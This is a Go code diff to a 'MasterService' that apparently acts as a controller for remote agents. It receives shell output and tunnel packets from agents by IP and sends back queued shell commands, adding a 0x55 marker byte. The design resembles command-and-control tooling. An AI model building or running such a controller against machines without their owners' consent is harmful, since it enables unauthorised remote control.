@@ -45,22 +45,28 @@ func (s MasterService) Run(ctx context.Context) error {
 			if s.TunnelManager != nil {
 				s.TunnelManager.HandlePacket(payload)
 			}
-			return nil, nil
-		}
-
-		// Handle ProtocolShell (1)
-		if len(payload) > 0 && s.Results != nil {
-			if err := s.Results.WriteResult(agentIP, payload); err != nil {
-				return nil, err
+		} else if protoID == protocol.ProtocolShell {
+			if len(payload) > 0 && s.Results != nil {
+				if err := s.Results.WriteResult(agentIP, payload); err != nil {
+					return nil, err
+				}
 			}
 		}
+
+		// Try to send tunnel packets first
+		if s.TunnelManager != nil {
+			if tunnelBuf := s.TunnelManager.TryDequeue(); tunnelBuf != nil {
+				return append([]byte{0x55, protocol.ProtocolTunnel}, tunnelBuf...), nil
+			}
+		}
+
 		if s.Commands == nil {
-			return []byte{protocol.ProtocolShell}, nil
+			return []byte{0x55, protocol.ProtocolShell}, nil
 		}
 		cmd, err := s.Commands.NextCommand(ctx, agentIP)
 		if err != nil {
 			return nil, err
 		}
-		return append([]byte{protocol.ProtocolShell}, cmd...), nil
+		return append([]byte{0x55, protocol.ProtocolShell}, cmd...), nil
 	})
 }
